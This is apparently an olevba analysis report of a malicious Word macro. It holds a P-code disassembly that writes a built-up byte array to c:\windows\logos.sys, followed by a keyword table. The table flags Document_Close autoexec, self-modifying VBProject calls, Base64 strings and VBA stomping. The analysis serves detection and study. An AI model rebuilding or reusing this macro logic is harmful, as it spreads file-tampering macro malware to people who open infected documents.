' Line #54:
' 	LitDI4 0x8BBC 0x0001 
' 	LitDI4 0x8BBD 0x0001 
' 	LitDI4 0x8BBF 0x0001 
' 	LitDI4 0x8CF5 0x0001 
' 	LitDI4 0x8CFC 0x0001 
' 	LitDI4 0x8CFF 0x0001 
' 	LitDI4 0x8E3F 0x0001 
' 	LitDI4 0x8E45 0x0001 
' 	LitDI4 0x8E46 0x0001 
' 	LitDI4 0x8E47 0x0001 
' 	LitDI4 0x8F7F 0x0001 
' 	LitDI4 0x8F82 0x0001 
' 	LitDI4 0x8F83 0x0001 
' 	LitDI4 0x8F84 0x0001 
' 	LitDI4 0x90BF 0x0001 
' 	LitDI4 0x90C1 0x0001 
' 	LitDI4 0x90C2 0x0001 
' 	LitDI4 0x90C3 0x0001 
' 	LitDI4 0x90C4 0x0001 
' 	LitDI4 0x91FF 0x0001 
' 	LitDI4 0x9200 0x0001 
' 	LitDI4 0x9201 0x0001 
' 	LitDI4 0x9202 0x0001 
' 	LitDI4 0x9203 0x0001 
' 	LitDI4 0x9204 0x0001 
' 	LitDI4 0x9206 0x0001 
' 	LitDI4 0x9207 0x0001 
' 	LitDI4 0x933F 0x0001 
' 	LitDI4 0x9340 0x0001 
' 	LitDI4 0x9341 0x0001 
' 	LitDI4 0x9342 0x0001 
' 	LitDI4 0x9343 0x0001 
' 	LitDI4 0x9344 0x0001 
' 	LitDI4 0x9345 0x0001 
' 	LitDI4 0x9346 0x0001 
' 	LitDI4 0x947F 0x0001 
' 	LitDI4 0x9480 0x0001 
' 	LitDI4 0x9481 0x0001 
' 	LitDI4 0x9482 0x0001 
' 	LitDI4 0x9483 0x0001 
' 	LitDI4 0x9484 0x0001 
' 	LitDI4 0x9485 0x0001 
' 	LitDI4 0x95C0 0x0001 
' 	LitDI4 0x95C1 0x0001 
' 	LitDI4 0x95C2 0x0001 
' 	LitDI4 0x95C3 0x0001 
' 	LitDI4 0x95C4 0x0001 
' 	LitDI4 0x95C5 0x0001 
' 	LitDI4 0x95C6 0x0001 
' 	LitDI4 0x95C7 0x0001 
' 	LitDI4 0x9700 0x0001 
' 	LitDI4 0x9701 0x0001 
' 	LitDI4 0x9702 0x0001 
' 	LitDI4 0x9703 0x0001 
' 	LitDI4 0x9704 0x0001 
' 	LitDI4 0x9705 0x0001 
' 	LitDI4 0x9706 0x0001 
' 	LitDI4 0x9840 0x0001 
' 	LitDI4 0x9841 0x0001 
' 	LitDI4 0x9842 0x0001 
' 	LitDI4 0x9843 0x0001 
' 	LitDI4 0x9844 0x0001 
' 	LitDI4 0x9980 0x0001 
' 	LitDI4 0x9981 0x0001 
' 	LitDI4 0x9982 0x0001 
' 	LitDI4 0x9AC0 0x0001 
' 	LitDI4 0x9C00 0x0001 
' 	LitDI4 0x9D40 0x0001 
' 	LitDI4 0x9E80 0x0001 
' 	LitDI4 0x72CB 0x0001 
' 	LitDI4 0x753B 0x0001 
' 	LitDI4 0x8081 0x0001 
' 	LitDI4 0x7F36 0x0001 
' 	LitDI4 0x8076 0x0001 
' 	LitDI4 0x81B6 0x0001 
' 	LitDI4 0x81BD 0x0001 
' 	LitDI4 0x82F6 0x0001 
' 	LitDI4 0x82FD 0x0001 
' 	LitDI4 0x8436 0x0001 
' 	LitDI4 0x843A 0x0001 
' 	LitDI4 0x843D 0x0001 
' 	LitDI4 0x857A 0x0001 
' 	LitDI4 0x857D 0x0001 
' 	ArgsArray Array 0x0053 
' 	St e 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0063 
' 	For 
' Line #56:
' 	Ld i 
' 	ArgsLd A 0x0001 
' 	Ld i 
' 	ArgsSt p 0x0001 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0063 
' 	For 
' Line #59:
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Ld i 
' 	LitDI2 0x0064 
' 	Add 
' 	ArgsSt p 0x0001 
' Line #60:
' 	StartForVariable 
' 	Next 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0063 
' 	For 
' Line #62:
' 	Ld i 
' 	ArgsLd C 0x0001 
' 	Ld i 
' 	LitDI2 0x00C8 
' 	Add 
' 	ArgsSt p 0x0001 
' Line #63:
' 	StartForVariable 
' 	Next 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0063 
' 	For 
' Line #65:
' 	Ld i 
' 	ArgsLd d 0x0001 
' 	Ld i 
' 	LitDI2 0x012C 
' 	Add 
' 	ArgsSt p 0x0001 
' Line #66:
' 	StartForVariable 
' 	Next 
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0052 
' 	For 
' Line #68:
' 	Ld i 
' 	ArgsLd e 0x0001 
' 	Ld i 
' 	LitDI2 0x0190 
' 	Add 
' 	ArgsSt p 0x0001 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	LitDI2 0x00CE 
' 	LitDI2 0x0000 
' 	ArgsSt V 0x0001 
' Line #71:
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsSt V 0x0001 
' Line #72:
' 	LitDI2 0x000E 
' 	LitDI2 0x0002 
' 	ArgsSt V 0x0001 
' Line #73:
' 	LitDI2 0x00D8 
' 	LitDI2 0x0003 
' 	ArgsSt V 0x0001 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0004 
' 	LitDI2 0x01D4 
' 	For 
' Line #75:
' 	LitDI2 0x00BA 
' 	Ld i 
' 	ArgsSt V 0x0001 
' Line #76:
' 	StartForVariable 
' 	Next 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x01D5 
' 	LitDI2 0x01D7 
' 	For 
' Line #78:
' 	LitDI2 0x00B8 
' 	Ld i 
' 	ArgsSt V 0x0001 
' Line #79:
' 	StartForVariable 
' 	Next 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x01D8 
' 	LitDI2 0x01E2 
' 	For 
' Line #81:
' 	LitDI2 0x00E2 
' 	Ld i 
' 	ArgsSt V 0x0001 
' Line #82:
' 	StartForVariable 
' 	Next 
' Line #83:
' 	Ld Friend 
' 	St nf 
' Line #84:
' 	LitStr 0x0014 "c:\windows\logos.sys"
' 	Ld nf 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x01E2 
' 	For 
' Line #86:
' 	Ld nf 
' 	Sharp 
' 	Ld i 
' 	ArgsLd p 0x0001 
' 	Ld i 
' 	ArgsLd V 0x0001 
' 	PutRec 
' Line #87:
' 	StartForVariable 
' 	Next 
' Line #88:
' 	Ld nf 
' 	Sharp 
' 	Close 0x0001 
' Line #89:
' 	EndSub 
' Line #90:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

